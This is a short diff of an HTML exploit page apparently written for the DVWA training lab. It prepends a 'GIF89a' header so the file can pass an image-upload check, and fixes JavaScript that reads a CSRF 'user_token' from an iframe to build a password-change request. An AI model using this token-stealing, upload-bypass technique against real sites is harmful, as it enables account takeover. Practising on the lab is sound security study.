@@ -1,3 +1,4 @@
+GIF89a
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -19,7 +20,7 @@
         var iframe = document.getElementById("myFrame");
         var doc =
           iframe.contentWindow.contentDocument || iframe.contentWindow.document;
-        var token = doc.getElementByName("user_token")[0].value;
+        var token = doc.getElementsByName("user_token")[0].value;
         const http = new XMLHttpRequest();
         const url =
           "http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change&user_token=" +
